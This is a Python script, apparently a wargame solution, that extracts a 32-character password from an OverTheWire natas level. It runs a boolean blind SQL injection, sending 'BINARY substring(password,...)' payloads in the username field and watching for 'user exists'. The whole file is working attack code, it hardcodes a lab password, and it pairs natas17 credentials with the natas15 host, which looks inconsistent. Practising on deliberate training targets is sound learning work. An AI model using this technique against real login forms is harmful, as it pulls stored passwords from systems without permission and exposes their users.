import requests
import string
char=string.ascii_letters+string.digits
pass_l=32
pas=""
i=1
while i<=pass_l:
	for c in char:
		payload={'username':f'natas17" and BINARY substring(password,1,{i})="{pas}{c}','password':"k"}
		r=requests.post("http://natas15.natas.labs.overthewire.org/?debug=koko",auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"),data=payload)
		if "user exists" in r.text:
			i+=1
			pas+=c
			print(pas+ " is in the password")
			break

